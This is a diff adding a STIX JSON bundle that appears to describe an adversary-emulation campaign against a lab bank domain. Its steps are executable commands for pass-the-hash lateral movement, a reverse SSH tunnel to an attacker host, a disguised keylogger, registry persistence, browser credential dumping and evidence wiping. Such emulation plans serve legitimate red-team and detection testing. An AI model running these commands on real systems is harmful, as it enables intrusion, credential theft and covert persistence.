+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--96ad59ad-f027-47d2-b869-e08aced5ec1d",
+            "created": "2024-02-03T18:17:42.735487Z",
+            "modified": "2024-02-03T18:17:42.735487Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--76c8f978-cc38-4281-8236-ecb7fae8f99c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4",
+            "created": "2024-02-03T18:17:42.736127Z",
+            "modified": "2024-02-03T18:17:42.736127Z",
+            "name": "Lateral Movement to bankdc from bankfileserver",
+            "description": "Lateral Movement to bankdc from bankfileserver using psexec.py",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1569.002",
+                    "input_arguments": {
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "Username of domain administrator",
+                            "type": "string"
+                        },
+                        "bankdc.ip.address": {
+                            "default": "10.0.0.4",
+                            "description": "IP address of bankdc",
+                            "type": "string"
+                        },
+                        "domain.admin.password.hash": {
+                            "default": "aad3b435b51404eeaad3b435b51404ee:c3aa78cd0827b8e8603ac1c8996e6556",
+                            "description": "NTLM hash of domain administrator's password",
+                            "type": "string"
+                        },
+                        "domain.name.full": {
+                            "default": "financial.local",
+                            "description": "Full name of the domain",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "chmod 755 /tmp/runtime && /tmp/runtime /tmp/psexec.py #{domain.name.full}/#{domain.admin.username}@#{bankdc.ip.address} -hashes #{domain.admin.password.hash}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Services: Service Execution"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6107f735-3519-4371-9147-beba340ed010",
+            "created": "2024-02-03T18:17:42.737912Z",
+            "modified": "2024-02-03T18:17:42.737912Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4",
+            "target_ref": "domain-name--9ed7503d-86ea-518f-aa7e-bb02d8adcc9f"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--9ed7503d-86ea-518f-aa7e-bb02d8adcc9f",
+            "value": "financial.local"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5c2d43fc-6ea1-4535-93eb-2472d4fe92fc",
+            "created": "2024-02-03T18:17:42.738795Z",
+            "modified": "2024-02-03T18:17:42.738795Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--feaa427c-1a67-437b-866a-55be2576df2d",
+            "created": "2024-02-03T18:17:42.741539Z",
+            "modified": "2024-02-03T18:17:42.741539Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4",
+            "target_ref": "artifact--3349970e-5014-5f56-9f37-eefef4296d8b"
+        },
+        {
+            "type": "artifact",
+            "spec_version": "2.1",
+            "id": "artifact--3349970e-5014-5f56-9f37-eefef4296d8b",
+            "url": "",
+            "hashes": {
+                "MD5": "aad3b435b51404eeaad3b435b51404ee"
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--614d75c5-50a3-4fc9-9311-9eb8fcfbb1ed",
+            "created": "2024-02-03T18:17:42.742987Z",
+            "modified": "2024-02-03T18:17:42.742987Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4",
+            "target_ref": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--93529ad0-d8ce-5150-982d-45b1523f0d10",
+            "value": "10.0.0.4"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5f44947f-cff9-4d27-9a83-b3bf6bbf83ca",
+            "created": "2024-02-03T18:17:42.7436Z",
+            "modified": "2024-02-03T18:17:42.7436Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--b82639f7-530b-4ff5-baa8-ff249cd73df4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--7e3a8de9-edb9-4df4-beef-9577c4562420",
+            "created": "2024-02-03T18:17:42.74485Z",
+            "modified": "2024-02-03T18:17:42.74485Z",
+            "name": "Upload and execute Tiny.exe on bankdc",
+            "description": "Upload and execute Tiny.exe on bankdc. Requires elevated agent",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1571",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Windows\\tiny.exe\n",
+                                "command": "Move-Item tiny.exe C:\\Windows\\tiny.exe;\nC:\\Windows\\tiny.exe 192.168.0.4 8080\n",
+                                "payloads": [
+                                    "tiny.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Non-Standard Port"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8d16504c-9ed2-4401-9c5c-5c4ec99b4db5",
+            "created": "2024-02-03T18:17:42.746008Z",
+            "modified": "2024-02-03T18:17:42.746008Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--7e3a8de9-edb9-4df4-beef-9577c4562420"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--c66c3b49-719f-4643-a307-4a889177b61d",
+            "created": "2024-02-03T18:17:42.747646Z",
+            "modified": "2024-02-03T18:17:42.747646Z",
+            "name": "Get CFO Workstation Information from bankdc",
+            "description": "Get CFO Workstation Information from bankdc by running Get-ADComputer",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Get-ADComputer -Identity 'cfo' -Properties *\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5052c8ed-ff9d-400f-a3a5-873dfbd44bc3",
+            "created": "2024-02-03T18:17:42.748619Z",
+            "modified": "2024-02-03T18:17:42.748619Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--c66c3b49-719f-4643-a307-4a889177b61d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--38d009be-4ba2-46dc-a321-8be05c07630c",
+            "created": "2024-02-03T18:17:42.750158Z",
+            "modified": "2024-02-03T18:17:42.750158Z",
+            "name": "Create SSH Tunnel on bankdc",
+            "description": "The nslookup utility is used to find the IP address of bankdc",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1572",
+                    "input_arguments": {
+                        "attacker.sshuser.password": {
+                            "default": "azsxdcAZSXDC123",
+                            "description": "Password of attacker ssh account",
+                            "type": "string"
+                        },
+                        "attacker.sshuser.username": {
+                            "default": "alfred",
+                            "description": "Username of attacker ssh account",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Windows\\Temp\\plink.exe\n",
+                                "command": "Move-Item plink.exe C:\\Windows\\Temp\\plink.exe;\necho n | C:\\Windows\\Temp\\plink.exe -pw \"#{attacker.sshuser.password}\" #{attacker.sshuser.username}@192.168.0.4 -R 3389:localhost:3389\n",
+                                "payloads": [
+                                    "plink.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Protocol Tunneling"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--92155b81-af48-4610-aeae-3d2208f398cc",
+            "created": "2024-02-03T18:17:42.75303Z",
+            "modified": "2024-02-03T18:17:42.75303Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--38d009be-4ba2-46dc-a321-8be05c07630c",
+            "target_ref": "user-account--49b6094d-226a-5d35-a387-f4ac66b160d3"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--49b6094d-226a-5d35-a387-f4ac66b160d3",
+            "account_login": "alfred"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--5c7bcac2-f5fe-4a38-9128-f75c15d20c46",
+            "created": "2024-02-03T18:17:42.754568Z",
+            "modified": "2024-02-03T18:17:42.754568Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--38d009be-4ba2-46dc-a321-8be05c07630c",
+            "target_ref": "user-account--7a767392-e142-4f35-b7e7-12f7e87db0c0"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--7a767392-e142-4f35-b7e7-12f7e87db0c0",
+            "credential": "azsxdcAZSXDC123"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e824595f-6ba2-411b-b338-559117c71b07",
+            "created": "2024-02-03T18:17:42.755105Z",
+            "modified": "2024-02-03T18:17:42.755105Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--38d009be-4ba2-46dc-a321-8be05c07630c"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--71c20631-adf4-4073-9f2f-6ab7f053326f",
+            "created": "2024-02-03T18:17:42.755899Z",
+            "modified": "2024-02-03T18:17:42.755899Z",
+            "name": "Check for Active CFO Login on CFO from BankDC",
+            "description": "Use qwinsta to check if the CFO user is logged into their workstation",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1033",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "qwinsta /server:cfo\n"
+                            }
+                        }
+                    },
+                    "technique_name": "System Owner/User Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--12f61e6c-23f3-4afe-aeb0-580dbcbbaef7",
+            "created": "2024-02-03T18:17:42.76511Z",
+            "modified": "2024-02-03T18:17:42.76511Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--71c20631-adf4-4073-9f2f-6ab7f053326f"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5beb978f-dce0-4ccd-b4fa-de47e0adb453",
+            "created": "2024-02-03T18:17:42.766721Z",
+            "modified": "2024-02-03T18:17:42.766721Z",
+            "name": "Upload JavaUpdate.exe and Create JavaUpdate.vbs on CFO",
+            "description": "Upload JavaUpdater.exe and Create JavaUpdater.vbs on CFO. Files renamed to prevent auto-removal after execution of step",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1105",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Users\\Public\\Java-Updater.exe;\nRemove-Item -Force C:\\Users\\Public\\Java-Update.vbs\n",
+                                "command": "Move-Item Java-Update.exe C:\\Users\\Public\\Java-Updater.exe;\necho Set oShell = CreateObject (\"Wscript.Shell\") > C:\\Users\\Public\\Java-Update.vbs;\necho Dim strArgs >> C:\\Users\\Public\\Java-Update.vbs;\necho strArgs = \"C:\\Users\\Public\\Java-Updater.exe\" >> C:\\Users\\Public\\Java-Update.vbs;\necho oShell.Run strArgs, 0, false >> C:\\Users\\Public\\Java-Update.vbs\n",
+                                "payloads": [
+                                    "Java-Update.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--74635e01-6d95-4568-8835-cc54ab929138",
+            "created": "2024-02-03T18:17:42.767252Z",
+            "modified": "2024-02-03T18:17:42.767252Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--5beb978f-dce0-4ccd-b4fa-de47e0adb453"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--6af29018-9779-49aa-ad8e-66627a23f329",
+            "created": "2024-02-03T18:17:42.767691Z",
+            "modified": "2024-02-03T18:17:42.767691Z",
+            "name": "Set Registry Persistence on CFO",
+            "description": "Set Registry Persistence on CFO to run Java-Update.vbs when the CFO user logs in",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1547.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "cmd.exe /c reg delete HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Java-Update\n",
+                                "command": "cmd.exe /c reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v Java-Update /t REG_SZ /d C:\\Users\\Public\\Java-Update.vbs\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ae633fea-2b80-474b-a328-606a7681a41f",
+            "created": "2024-02-03T18:17:42.768233Z",
+            "modified": "2024-02-03T18:17:42.768233Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--6af29018-9779-49aa-ad8e-66627a23f329"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--5f3f7045-ae92-4a3e-8b39-35e4f8cc3038",
+            "created": "2024-02-03T18:17:42.768653Z",
+            "modified": "2024-02-03T18:17:42.768653Z",
+            "name": "Upload and Execute Keylogger on CFO as CFO",
+            "description": "Upload and Execute Keylogger on CFO as CFO",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1056.001",
+                    "input_arguments": {
+                        "cfo.user.username": {
+                            "default": "jsmith",
+                            "description": "Username of CFO user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe\n",
+                                "command": "Move-Item keylogger.exe C:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe;\nC:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\DefenderUpgradeExec.exe\n",
+                                "payloads": [
+                                    "keylogger.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Input Capture: Keylogging"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--28549a98-6e5a-4d95-aa35-2eb19891db80",
+            "created": "2024-02-03T18:17:42.769687Z",
+            "modified": "2024-02-03T18:17:42.769687Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--5f3f7045-ae92-4a3e-8b39-35e4f8cc3038",
+            "target_ref": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0",
+            "account_login": "jsmith"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--58bf2129-91af-45d3-b5fc-80e3926daed0",
+            "created": "2024-02-03T18:17:42.770219Z",
+            "modified": "2024-02-03T18:17:42.770219Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--5f3f7045-ae92-4a3e-8b39-35e4f8cc3038"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--8b2f52d8-40d8-4f70-bf9e-cb999d325958",
+            "created": "2024-02-03T18:17:42.777509Z",
+            "modified": "2024-02-03T18:17:42.777509Z",
+            "name": "Read Keylogging Data",
+            "description": "Read contents of keylogger output file",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1056.001",
+                    "input_arguments": {
+                        "cfo.user.username": {
+                            "default": "jsmith",
+                            "description": "Username of CFO user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "type C:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\klog2.txt\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Input Capture: Keylogging"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4b24f373-c2d8-46e5-83c5-5465d51e91c4",
+            "created": "2024-02-03T18:17:42.77834Z",
+            "modified": "2024-02-03T18:17:42.77834Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8b2f52d8-40d8-4f70-bf9e-cb999d325958",
+            "target_ref": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0",
+            "account_login": "jsmith"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cd59eedb-df78-4292-81ea-3826d23ca002",
+            "created": "2024-02-03T18:17:42.778904Z",
+            "modified": "2024-02-03T18:17:42.778904Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--8b2f52d8-40d8-4f70-bf9e-cb999d325958"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--22ddbc4f-fb5d-4785-8bc8-373da2f3e176",
+            "created": "2024-02-03T18:17:42.779787Z",
+            "modified": "2024-02-03T18:17:42.779787Z",
+            "name": "Upload and Execute Web Cred Dumper on CFO as CFO",
+            "description": "Upload and Execute Web Cred Dumper on CFO as CFO",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1555.003",
+                    "input_arguments": {
+                        "cfo.user.username": {
+                            "default": "jsmith",
+                            "description": "Username of CFO user",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\infosMin48.exe\n",
+                                "command": "Move-Item dumpWebCreds.exe C:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\infosMin48.exe;\nC:\\Users\\#{cfo.user.username}\\AppData\\Local\\Temp\\infosMin48.exe -i -H\n",
+                                "payloads": [
+                                    "dumpWebCreds.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Credentials from Password Stores: Credentials from Web Browsers"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b049183b-9050-4ea3-a8eb-20447df3a041",
+            "created": "2024-02-03T18:17:42.781123Z",
+            "modified": "2024-02-03T18:17:42.781123Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--22ddbc4f-fb5d-4785-8bc8-373da2f3e176",
+            "target_ref": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--96dd379e-d10f-57ad-b2b9-8cf9086a0fd0",
+            "account_login": "jsmith"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--412be2e6-465c-4ba4-99a4-f46c2039aac0",
+            "created": "2024-02-03T18:17:42.781578Z",
+            "modified": "2024-02-03T18:17:42.781578Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--22ddbc4f-fb5d-4785-8bc8-373da2f3e176"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f3678315-cdbb-4579-b25d-f92783e5599b",
+            "created": "2024-02-03T18:17:42.781941Z",
+            "modified": "2024-02-03T18:17:42.781941Z",
+            "name": "Stop Keylogger and Clean Artifacts",
+            "description": "Stop Keylogger and clean artifacts in TEMP directory",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1070.004",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "Stop-Process -Name DefenderUpgradeExec;\nRemove-Item $env:TEMP\\* -Recurse -Force -Erroraction 'silentlycontinue'\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Indicator Removal on Host: File Deletion"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d223734b-c7fc-4ac7-b725-ccf5e99d97c1",
+            "created": "2024-02-03T18:17:42.782303Z",
+            "modified": "2024-02-03T18:17:42.782303Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--f3678315-cdbb-4579-b25d-f92783e5599b"
+        }
+    ]
+}
